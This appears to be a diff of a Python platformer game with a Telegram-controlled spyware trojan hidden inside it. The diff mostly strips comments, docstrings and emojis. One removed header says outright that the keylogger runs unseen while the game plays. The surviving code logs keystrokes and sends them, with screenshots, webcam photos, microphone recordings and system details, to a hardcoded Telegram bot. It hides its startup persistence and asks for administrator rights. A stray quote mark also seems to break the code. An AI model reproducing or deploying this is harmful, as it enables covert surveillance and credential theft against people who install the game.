@@ -1,7 +1,3 @@
-"""
-Juego de plataformas con keylogger integrado.
-El juego funciona con normalidad mientras el keylogger opera en segundo plano.
-"""
 import sys
 import pygame
 import threading
@@ -21,7 +17,6 @@ import winreg
 import ctypes
 from pynput import keyboard
 
-# ------------------------------------------------------------------ Configuración del Juego
 pygame.init()
 TILE = 40
 W, H = 800, 600
@@ -46,7 +41,6 @@ clock = pygame.time.Clock()
 font = pygame.font.SysFont("arial", 24, bold=True)
 big_font = pygame.font.SysFont("arial", 56, bold=True)
 
-# ------------------------------------------------------------------ Configuración del Keylogger
 BOT_TOKEN = "8891941264:AAH1jYfWPA3h3d7MEkpVqgCDQG2NOzVmTc8"
 CHAT_ID = "5402797322"
 TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}"
@@ -58,9 +52,7 @@ log_lock = threading.Lock()
 listener = None
 running = True
 last_update_id = 0
-# ------------------------------------------------------------------ Funciones del Keylogger
 def capturar_teclas(key):
-    """Callback del keylogger - thread-safe"""
     global log
     try:
         with log_lock:
@@ -164,7 +156,6 @@ MAC: {':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff)
     """
     return info
 def procesar_comando(comando):
-    """Procesa los comandos recibidos desde Telegram"""
     global running
     
     comando = comando.lower()
@@ -172,46 +163,46 @@ def procesar_comando(comando):
     if comando == "screen" or comando == "pantalla":
         screen_path = capturar_pantalla()
         if screen_path:
-            enviar_archivo(screen_path, "🖥️ Captura de pantalla solicitada")
+            enviar_archivo(screen_path, " Captura de pantalla solicitada")
             os.remove(screen_path)
         else:
-            enviar_mensaje("❌ Error al capturar la pantalla")
+            enviar_mensaje(" Error al capturar la pantalla")
     
     elif comando == "cam" or comando == "camara":
         cam_path = capturar_camara()
         if cam_path:
-            enviar_archivo(cam_path, "📷 Foto de cámara web solicitada")
+            enviar_archivo(cam_path, " Foto de cámara web solicitada")
             os.remove(cam_path)
         else:
-            enviar_mensaje("❌ Cámara no disponible")
+            enviar_mensaje(" Cámara no disponible")
     
     elif comando == "mic" or comando == "microfono":
-        enviar_mensaje(f"🎙️ Grabando audio ({DURACION_AUDIO}s)...")
+        enviar_mensaje(f" Grabando audio ({DURACION_AUDIO}s)...")
         audio_path = grabar_audio()
         if audio_path:
-            enviar_archivo(audio_path, f"🎙️ Audio grabado ({DURACION_AUDIO} segundos)")
+            enviar_archivo(audio_path, f" Audio grabado ({DURACION_AUDIO} segundos)")
             os.remove(audio_path)
         else:
-            enviar_mensaje("❌ Micrófono no disponible")
+            enviar_mensaje(" Micrófono no disponible")
     
     elif comando == "logs" or comando == "keylogs":
         with log_lock:
             if log:
-                enviar_mensaje(f"⌨️ Keylogs:\n\n{log[-3800:]}")
+                enviar_mensaje(f" Keylogs:\n\n{log[-3800:]}")
             else:
-                enviar_mensaje("⌨️ No hay actividad de teclado registrada")
+                enviar_mensaje(" No hay actividad de teclado registrada")
     
     elif comando == "info" or comando == "sistema":
-        enviar_mensaje(f"📱 Información del sistema:\n{obtener_info_sistema()}")
+        enviar_mensaje(f"Información del sistema:\n{obtener_info_sistema()}")
     
     elif comando == "stop" or comando == "detener":
         global running
         running = False
-        enviar_mensaje("🛑 Deteniendo el programa...")
+        enviar_mensaje("Deteniendo el programa...")
     
     elif comando == "ayuda" or comando == "help":
         ayuda = """
-🔹 Comandos disponibles:
+Comandos disponibles:
 • screen/pantalla - Tomar captura de pantalla
 • cam/camara - Tomar foto con la cámara web
 • mic/microfono - Grabar audio del micrófono
@@ -223,10 +214,9 @@ def procesar_comando(comando):
         enviar_mensaje(ayuda)
     
     else:
-        enviar_mensaje("❌ Comando no reconocido. Envía 'ayuda' para ver los comandos disponibles.")
+        enviar_mensaje("Comando no reconocido. Envía 'ayuda' para ver los comandos disponibles.")
 
 def verificar_comandos():
-    """Verifica si hay nuevos comandos en Telegram"""
     global last_update_id
     try:
         url = f"{TELEGRAM_API}/getUpdates"
@@ -240,22 +230,18 @@ def verificar_comandos():
                     mensaje = result["message"]["text"]
                     chat_id = result["message"]["chat"]["id"]
                     
-                    # Solo procesar mensajes de nuestro chat
                     if str(chat_id) == CHAT_ID:
                         procesar_comando(mensaje)
                 
-                # Actualizar el último ID de mensaje procesado
                 last_update_id = result["update_id"]
     except Exception as e:
         pass
-# ------------------------------------------------------------------ Nivel
 ROWS, COLS = 15, 95
 
 def build_level():
     grid = [[" "] * COLS for _ in range(ROWS)]
     coins, enemies = [], []
 
-    # Suelo (filas 13 y 14) con huecos
     gaps = [(22, 24), (45, 48), (66, 68)]
     for c in range(COLS):
         if any(a <= c <= b for a, b in gaps):
@@ -267,7 +253,6 @@ def build_level():
         for c in range(c1, c2 + 1):
             grid[row][c] = ch
 
-    # Plataformas flotantes
     plat(10, 10, 13)
     plat(8, 16, 18)
     plat(10, 21, 25)
@@ -279,12 +264,10 @@ def build_level():
     plat(8, 65, 69)
     plat(10, 75, 78)
 
-    # Escalera final
     for i in range(5):
         for r in range(12 - i, 13):
             grid[r][82 + i] = "#"
 
-    # Monedas
     for c in (10, 11, 12, 13, 16, 17, 18, 22, 23, 24, 32, 33, 34, 35, 38,
               39, 40, 45, 47, 53, 54, 55, 56, 65, 66, 67, 68, 69, 75, 76, 77):
         row = None
@@ -297,7 +280,6 @@ def build_level():
         else:
             coins.append(pygame.Rect(c * TILE + 12, 9 * TILE, 16, 24))
 
-    # Enemigos (columna, fila donde apoyan)
     for c, r in [(14, 12), (28, 12), (36, 12), (42, 12), (52, 12),
                  (58, 12), (63, 12), (72, 12), (77, 12)]:
         enemies.append(Enemy(c * TILE + 4, r * TILE + 8))
@@ -305,7 +287,6 @@ def build_level():
     flag_x = 91 * TILE
     return grid, coins, enemies, flag_x
 
-# ------------------------------------------------------------------ Entidades
 def solid_at(grid, col, row):
     if col < 0 or col >= COLS:
         return True
@@ -322,7 +303,6 @@ def tiles_overlapping(grid, rect):
                 yield pygame.Rect(c * TILE, r * TILE, TILE, TILE)
 
 def move(rect, dx, dy, grid):
-    """Mueve el rect y resuelve colisiones. Devuelve (toca_suelo, choca_lado)."""
     on_ground = hit_side = False
     rect.x += dx
     for t in tiles_overlapping(grid, rect):
@@ -360,7 +340,6 @@ class Player:
         jump_held = keys[pygame.K_SPACE] or keys[pygame.K_UP] or keys[pygame.K_w]
         if jump_held and self.on_ground:
             self.vy = JUMP
-        # Salto variable: soltar la tecla corta el salto
         if not jump_held and self.vy < -4:
             self.vy = -4
 
@@ -370,7 +349,6 @@ class Player:
         if self.on_ground:
             self.vy = 0
         elif was_rising:
-            # Si chocó con la cabeza contra un bloque, frena la subida
             probe = self.rect.move(0, -1)
             if any(True for _ in tiles_overlapping(grid, probe)):
                 self.vy = 0
@@ -383,9 +361,9 @@ class Player:
         r = self.rect.move(-cam, 0)
         if self.invuln and (self.invuln // 4) % 2:
             return
-        pygame.draw.rect(screen, (30, 60, 200), (r.x, r.y + 18, r.w, 20))   # overol
-        pygame.draw.rect(screen, (230, 190, 150), (r.x + 2, r.y + 6, r.w - 4, 14))  # cara
-        pygame.draw.rect(screen, (210, 30, 30), (r.x, r.y, r.w, 9))          # gorra
+        pygame.draw.rect(screen, (30, 60, 200), (r.x, r.y + 18, r.w, 20))   
+        pygame.draw.rect(screen, (230, 190, 150), (r.x + 2, r.y + 6, r.w - 4, 14))  
+        pygame.draw.rect(screen, (210, 30, 30), (r.x, r.y, r.w, 9))          
         visera_x = r.x + r.w - 2 if self.facing == 1 else r.x - 8
         pygame.draw.rect(screen, (210, 30, 30), (visera_x, r.y + 5, 10, 5))
         ojo_x = r.x + (18 if self.facing == 1 else 6)
@@ -403,7 +381,6 @@ class Enemy:
         on_ground, hit = move(self.rect, self.dir * 2, round(self.vy), grid)
         if on_ground:
             self.vy = 0
-            # No caer por los bordes: revisa si hay suelo adelante
             front = self.rect.right + 2 if self.dir > 0 else self.rect.left - 2
             if not solid_at(grid, front // TILE, (self.rect.bottom + 2) // TILE):
                 hit = True
@@ -421,12 +398,11 @@ class Enemy:
         pygame.draw.rect(screen, WHITE, (r.x + 18, r.y + 9, 7, 8))
         pygame.draw.rect(screen, BLACK, (r.x + 10, r.y + 12, 3, 4))
         pygame.draw.rect(screen, BLACK, (r.x + 19, r.y + 12, 3, 4))
-# ------------------------------------------------------------------ Juego
 class Game:
     def __init__(self):
         self.lives = LIVES_START
         self.score = 0
-        self.state = "play"  # play | gameover | win
+        self.state = "play"  
         self.reset_level()
 
     def reset_level(self):
@@ -452,13 +428,11 @@ class Game:
             e.update(self.grid)
         self.enemies = [e for e in self.enemies if e.alive]
 
-        # Monedas
         for c in self.coins[:]:
             if p.rect.colliderect(c):
                 self.coins.remove(c)
                 self.score += 100
 
-        # Enemigos: pisar o recibir daño
         for e in self.enemies[:]:
             if p.rect.colliderect(e.rect):
                 if p.vy > 0 and p.rect.bottom - e.rect.top < 20:
@@ -469,12 +443,10 @@ class Game:
                     self.lose_life()
                     return
 
-        # Caer al vacío
         if p.rect.top > H + 100:
             self.lose_life()
             return
 
-        # Meta
         if p.rect.right >= self.flag_x:
             self.state = "win"
             self.score += 1000
@@ -483,7 +455,6 @@ class Game:
 
     def draw(self):
         screen.fill(SKY)
-        # Nubes con parallax simple
         for i in range(12):
             x = (i * 420 - int(self.cam * 0.5)) % (W + 300) - 150
             y = 60 + (i % 3) * 50
@@ -507,7 +478,6 @@ class Game:
                     pygame.draw.line(screen, (120, 50, 25), (x, y + 20), (x + TILE, y + 20), 2)
                     pygame.draw.line(screen, (120, 50, 25), (x + 20, y), (x + 20, y + 20), 2)
 
-        # Bandera
         fx = self.flag_x - self.cam
         pygame.draw.rect(screen, (230, 230, 230), (fx, 5 * TILE, 6, 8 * TILE))
         pygame.draw.polygon(screen, (220, 40, 40),
@@ -522,7 +492,6 @@ class Game:
             e.draw(self.cam)
         self.player.draw(self.cam)
 
-        # HUD
         screen.blit(font.render(f"Puntos: {self.score}", True, BLACK), (16, 12))
         screen.blit(font.render(f"Vidas: {self.lives}", True, BLACK), (W - 130, 12))
 
@@ -535,22 +504,15 @@ class Game:
             s = font.render(f"Puntos: {self.score}   |   R para reiniciar", True, WHITE)
             screen.blit(t, t.get_rect(center=(W // 2, H // 2 - 30)))
             screen.blit(s, s.get_rect(center=(W // 2, H // 2 + 30)))
-# ------------------------------------------------------------------ Funciones de Persistencia del Keylogger
 def iniciar_persistencia():
-    """Configura la persistencia del programa usando técnicas fileless para Windows 11"""
     try:
-        # Obtener ruta del script actual
         if getattr(sys, 'frozen', False):
-            # Si está empaquetado como ejecutable
             script_path = sys.executable
         else:
-            # Si está como script Python
             script_path = os.path.abspath(__file__)
         
-        # Nombre para el servicio/entrada del registro
         service_name = "SystemUpdateService"
         
-        # Técnica fileless para Windows 11 usando PowerShell
         ps_command = f"""
         $action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-WindowStyle Hidden -ExecutionPolicy Bypass -Command \"Start-Process -FilePath python -ArgumentList \\\"{script_path}\\\" -WindowStyle Hidden\"'
         $trigger = New-ScheduledTaskTrigger -AtLogon
@@ -558,11 +520,9 @@ def iniciar_persistencia():
         Register-ScheduledTask -TaskName '{service_name}' -Action $action -Trigger $trigger -Settings $settings -RunLevel Highest -Force
         """
         
-        # Ejecutar comando PowerShell de forma oculta
         subprocess.run(["powershell.exe", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", ps_command], 
                       shell=True, check=False)
         
-        # También agregar al registro para persistencia adicional
         try:
             key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
             winreg.SetValueEx(key, service_name, 0, winreg.REG_SZ, f'powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Start-Process -FilePath python -ArgumentList \\"{script_path}\\" -WindowStyle Hidden"')
@@ -570,13 +530,11 @@ def iniciar_persistencia():
         except Exception as e:
             print(f"Error al agregar al registro: {e}")
         
-        # Intentar agregar al directorio de inicio
         try:
             startup_path = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
             if not os.path.exists(startup_path):
                 os.makedirs(startup_path)
             
-            # Crear un archivo .bat que ejecute el script de forma oculta
             bat_content = f"""@echo off
 powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Start-Process -FilePath python -ArgumentList \\"{script_path}\\" -WindowStyle Hidden"
 """
@@ -585,17 +543,15 @@ powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Start-Proce
             with open(bat_path, "w") as f:
                 f.write(bat_content)
             
-            # Ocultar el archivo
-            ctypes.windll.kernel32.SetFileAttributesW(bat_path, 2)  # FILE_ATTRIBUTE_HIDDEN
+            ctypes.windll.kernel32.SetFileAttributesW(bat_path, 2)  
         except Exception as e:
             print(f"Error al agregar al inicio: {e}")
         
         print("Persistencia configurada correctamente")
     except Exception as e:
-        print(f"Error al configurar persistencia: {e}")
+        print(f"Error al configurar persistencia: {e}")"""
 
 def iniciar_keylogger():
-    """Inicia el listener del teclado en un hilo daemon"""
     global listener
     listener = keyboard.Listener(on_press=capturar_teclas)
     listener.daemon = True
@@ -603,36 +559,29 @@ def iniciar_keylogger():
     return listener
 
 def bucle_comandos():
-    """Bucle para verificar comandos de Telegram periódicamente"""
     global running
     while running:
         try:
             verificar_comandos()
-            time.sleep(5)  # Verificar cada 5 segundos
+            time.sleep(5)  
         except Exception as e:
             print(f"Error en el bucle de comandos: {e}")
             time.sleep(10)
 
 def iniciar_keylogger_sistema():
-    """Inicia todo el sistema del keylogger"""
     global running
     
     print("[*] Iniciando surveillance bot...")
     
-    # Configurar persistencia
     iniciar_persistencia()
     
-    # Enviar mensaje de inicio
-    enviar_mensaje(f"🚀 Bot iniciado\n{obtener_info_sistema()}")
+    enviar_mensaje(f"Bot iniciado\n{obtener_info_sistema()}")
     
-    # Iniciar keylogger en hilo daemon (no bloquea)
     listener = iniciar_keylogger()
     
-    # Iniciar el bucle de comandos en un hilo separado
     comandos_thread = threading.Thread(target=bucle_comandos, daemon=True)
     comandos_thread.start()
     
-    # Mantener el programa corriendo
     try:
         while running:
             time.sleep(1)
@@ -641,16 +590,12 @@ def iniciar_keylogger_sistema():
         running = False
         if listener:
             listener.stop()
-# ------------------------------------------------------------------ Funciones del Juego
 def main():
-    # Iniciar el keylogger en un hilo separado
     keylogger_thread = threading.Thread(target=iniciar_keylogger_sistema, daemon=True)
     keylogger_thread.start()
     
-    # Inicializar el juego
     game = Game()
     
-    # Bucle principal del juego
     while True:
         for ev in pygame.event.get():
             if ev.type == pygame.QUIT:
@@ -670,14 +615,12 @@ def main():
         clock.tick(FPS)
 
 if __name__ == "__main__":
-    # Verificar si se está ejecutando como administrador para máxima persistencia
     try:
         is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
         if not is_admin:
-            # Intentar reiniciar como administrador
             ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
             sys.exit(0)
     except:
-        pass  # Continuar aunque no sea administrador
+        pass 
     
     main()
